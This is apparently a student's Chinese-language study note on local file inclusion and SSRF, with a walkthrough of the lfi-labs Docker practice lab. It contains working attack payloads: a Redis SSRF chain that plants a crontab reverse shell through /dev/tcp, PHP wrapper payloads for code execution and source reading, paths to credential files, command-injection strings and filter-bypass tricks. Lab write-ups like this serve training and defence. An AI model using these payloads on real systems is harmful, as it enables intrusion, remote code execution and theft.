## 一.搭建lfi-labs靶场
在命令提示符中输入`docker pull jnazario/lfi-labs`等加载成功，再输入`docker run -d --name lfi-labs -p 8080:80 jnazario/lfi-labs`在输入`docker start lfi-labs`成功后访问`http://localhost:8080/index.php`可以到靶场
(快速搭建某个靶场，cd "源码目录" 再`docker build -t my-lfi-labs:latest .`以lfi-labs靶场为例，`docker run -d --name my-lfi -p 8080:80 my-lfi-labs:latest`,记得将8080换成一个不被占用的靶场)
## 二.PHP伪协议
1. `file://`协议：用来读取本地的文件，当用于文件读取函数时可以用。
- 常见检测是否存在漏洞写法：`www.xxx.com/?file=file:///etc/passwd`
- 此协议不受allow_url_fopen,allow_url_include配置影响
2. `php://input`协议，此协议一般用于输入getshell的代码,
使用方法：在GET处填上php://input如下`www.xxx.xxx/?cmd=php://input`然后用hackbar工具postphp代码进行检验，如`<?php>phpinfo()?>`,此协议受allow_url_include配置影响，用于读取POST数据。
3. `php://filter`协议，此协议一般用于查看源码，一般用法如下，`www.xxx.xxx/?file=php://filter/read=convert.base64-encode/resource=index.php`出来是base64编码，需要解码，此协议不受allow_url_fopen,allow_url_include配置影响
4. `data://`协议，需要allow_url_fopen,allow_url_include均为on，这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：`http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>`text/plain表示的是文本，`text/plain;base64`, 若纯文本没用可用base64编码，data://协议可以将文本伪装成一个文件
5. `dict://`协议，与gopher协议一般都出现在**ssrf**协议中，用来探测端口的指纹信息。同时也可以用它来代替gopher协议进行ssrf攻击。
- 检测端口指纹：`192.168.0.0/?url=dict://192.168.0.0:6379`以上为探测6379端口的开发
- 开启反弹shell的监听`nc -l 9999`
- 依次执行下面的命令`curl dict://192.168.0.119:6379/set:mars:"\n\n * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n"`
- `curl dict://192.168.0.119:6379/config:set:dir:/etc/`
- `curl dict://192.168.0.119:6379/config:set:dbfilename:crontab`
- `curl dict://192.168.0.119:6379/bgsave*`

1. `gopher://`协议，gopher://协议经常用来打内网的各种应用如mysql redis等。一般要用一些工具来进行构造payload 如gopherus等
2. `zip://`协议，zip://协议可以用来访问服务器中的压缩包，无论压缩包里面的文件是什么类型的都可以执行。也就是说如果服务器禁止我们上传php文件那么我们可以把php文件改后缀然后压缩再上传，然后用zip协议访问。要利用zip协议时一般要结合文件上传与文件包含两个漏洞，一般代码为`www.xxx.xxx/?file=zip:///php.zip#phpinfo.jpg`其中的#后表示的是php.zip的子文件名。有时候#需要变成%23，url编码。
3. compress.bzip2://协议,与zip协议类似不过要压缩成bzip2格式的
4. compress.zlib://协议,与zip协议类似不过要压缩成zlib格式的
5. phar://协议，phar://协议与zip://协议类似，它也可以访问zip包，访问的格式与zip的不同，如下所示`http://127.0.0.1/include.php? file=phar:///phpinfo.zip/phpinfo.txt`用/隔开了子文件
6. ftp:// 可用于网络端口扫描
7. 在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。
8. TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
## 三.SSRF
- **定义**：SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
- **漏洞原理**：SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器
- **漏洞挖掘**：分享：通过URL地址分享网页内容  
转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。
在线翻译:通过URL地址翻译对应文本的内容
title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。
未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。
开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题
利用google 语法加上这些关键字去寻找SSRF漏洞
> share  
> wap  
> url  
> link  
> src  
> source  
> target  
> u  
> display  
> sourceURl  
> imageURL  
> domain

所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞
**绕过方式**：
1. 限制为http://www.xxx.com 域名时（利用@）
可以尝试采用http基本身份认证的方式绕过
如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
2. 采用短网址绕过
比如百度短地址https://dwz.cn/
3. 采用进制转换
127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.
4. 利用特殊域名
 原理是DNS解析。**xip.io**可以指向任意域名，即  
127.0.0.1.xip.io，可解析为127.0.0.1  
 (xip.io 现在好像用不了了，可以找找其他的)

5. 利用[::]
可以利用[::]来绕过localhost  
`http://169.254.169.254>>http://[::169.254.169.254]`
6. 利用句号
127。0。0。1 >>> 127.0.0.1
7. CRLF编码绕过
%0d->0x0d->\r回车  
%0a->0x0a->\n换行  
进行HTTP头部注入
例如：`example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a`
8. 利用封闭的字母数字
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿


**基本绕过思路**
1. 限制为http://www.xxx.com 域名
采用http基本身份认证的方式绕过，即@  
http://www.xxx.com@www.xxc.com
2. 限制请求IP不为内网地址
（1）采取短网址绕过  
（2）采取特殊域名  
（3）采取进制转换
3. 限制请求只为http协议
（1）采取302跳转  
（2）采取短地址
## 文件包含
程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为包含。
​ 程序开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件,造成文件包含漏洞。
#### 文件包含常用函数
- include(): 执行到include()函数时才包含文件，当找不到文件时会产生警告，然后继续执行后续脚本。
- require(): 与include()的区别在于当找不到文件时，会产生致命错误，并停止脚本。
- include_once()：和Include()函数相同的作用，只不过若文件已经被包含，则不会再次包含。
- require_once(): 和require文件相同的作用，若文件已经被包含，则不会再次包含。
#### 攻击手法
当我们使用上述的四个函数进行文件包含的时候，如果被包含的文件符合PHP语法规范，那么任何拓展名都会被PHP解析。如果包含的是非PHP规范的源代码或文件，则会暴露其源代码或者文件内容。
对于符合PHP规范的文件，我们在利用时，可以通过file://或者php://这样的伪协议来读取源代码。
**读取系统文件**：C：\boot.ini :读取系统版本
- C: \windows\System32\inetsrv\MetaBasw.xml : IIS 配置文件
- C: \windows\repaire\sam ：存储的系统初次安装的密码
- C: \windows\php.ini :读取PHP配置信息
**读取源码**
示例方法： ?page=php://filter/read=convert.base64-encode/resourse=config.php
**执行恶意代码**
- eg: include(…/…/…/shell.php)
- eg:include(…/upload/shell.php)
## WriteUp
1. **CMD-1**:根据源码可知，get传参，cmd为参数名，直接传参，因为搭建在windows可以用windows指令，发送get请求`?cmd=whoami`,得到www.data
2. **CMD-2**:这一关发送post请求`cmd=whoami`得到www.data
3. **CMD-3**:这里调用了系统命令whois，需要传入domain，显然直接输入命令不起作用，这里利用管道符：`cmd1|cmd2:不论cmd1是否为真，cmd2都会被执行； cmd1;cmd2：不论cmd1是否为真，cmd2都会被执行； cmd1||cmd2：如果cmd1为假，则执行cmd2； cmd1&&cmd2：如果cmd1为真，则执行cmd2；`发送get请求`?domain=baidu.com||whoami`
4. **CMD-4**:发送post请求`domain=google.com||whoami`,
5. **CMD-5**:由源码
```php
if (preg_match('/^[-a-z0-9]+\.a[cdefgilmnoqrstuwxz]|b[abdefghijmnorstvwyz]|c[acdfghiklmnoruvxyz]|d[ejkmoz]|e[cegrstu]|f[ijkmor]|g[abdefghilmnpqrstuwy]|h[kmnrtu]|i[delmnoqrst]|j[emop]|k[eghimnprwyz]|l[abcikrstuvy]|m[acdeghklmnopqrstuvwxyz]|n[acefgilopruz]|om|p[aefghklmnrstwy]|qa|r[eosuw]|s[abcdeghijklmnortuvyz]|t[cdfghjklmnoprtvwz]|u[agksyz]|v[aceginu]|w[fs]|y[et]|z[amw]|biz|cat|com|edu|gov|int|mil|net|org|pro|tel|aero|arpa|asia|coop|info|jobs|mobi|name|museum|travel|arpa|xn--[a-z0-9]+$/', strtolower($_GET["domain"])))
        { system("whois -h " . $_GET["server"] . " " . $_GET["domain"]); } 
```
可知过滤了一些东西，但是没有过滤server,对server进行构造，发送get请求`?domain=whois -h google.com||whoami`
6. **CMD-6**:发送post请求`domain=whois -h google.com||whoami`
7. **LFI-1**:因为对上传文件没有限制，在上级文件创建了一个test.php内容为
```php
<?php
phpinfo();
?>
```
发送get请求，`?page=/opt/lfi-labs/test.php`,得到配置表（我把C:\Users\Lenovo\Desktop\lfi-labs-master路径挂载到了容器内的 `/opt/lfi-labs`，因为是docker搭建，必须挂载）
8. **LFI-2**:将我们传入的library参数 前面加了“includes/” 后面加了“.php” 可以采用截断后面的“.php”。用%00截断，注释掉.php。所以get请求`?library=../../test`(去掉末尾的.php)
9. **LFI-3**:根据源代码了解，对输入的参数进行了判断，参数的后4个字符不能是.php，否则会显示“You are not allowed to see source files!”。在test.php后面加"."或者"%00"。这样substr截取时，截取的是php.或php 而不是.php。而.和 在查询时会被自动剔除（不符合命名规则）,或者可以用大写PHP绕过，因为windows文件名不区分大小写，如果不是php文件则可以正常上传(这关不知为何过不了)
10. **LFI-4**:`addslashes()` 是 PHP 中的一个字符串处理函数，主要用于**在字符串中的特殊字符前添加反斜杠（\）**，目的是为了避免这些特殊字符在特定场景（如数据库查询、HTML 输出）中引发语法错误或安全问题。1. 单引号（`'`）→ 转义为 `\'`双引号（`"`）→ 转义为 `\"`反斜杠（`\`）→ 转义为 `\\`NUL 字符（ASCII 码 0 的空字符，通常用 `\0` 表示）→ 转义为 `\0`，所以可以用`?class=../../../../test`来绕过（去掉.php）
11. **LFI-5**:这一关将../替换为了空，但是只替换一次，所以可以用`..././..././test.php`绕过
12. **LFI-6**:这一关用Post请求，没有任何绕过`page=../test.php`
13. **LFI-7**:因为会自动拼接.php所以post请求`library=../../test`
14. **LFI-8**:与lfi-3同理，这关也过不了
15. **LFI-9**:同lfi-4,只不过为post请求
16. **LFI-10**:同lfi-5,只不过为post请求
17. **LFI-11**:因为用post提交，但是不是通过文本框中提交，真正的用hidden隐藏起来了。所以我们需要通过burp进行POST请求`stylepath=../test.php`
18. **LFI-12**:利用burp发送get请求`?stylepath=../test.php`
19. **LFI-13**:因为把../替换为空所以发送get请求`?file=..././..././test.php`
20. **LFI-14**:同十三关，改为发送post请求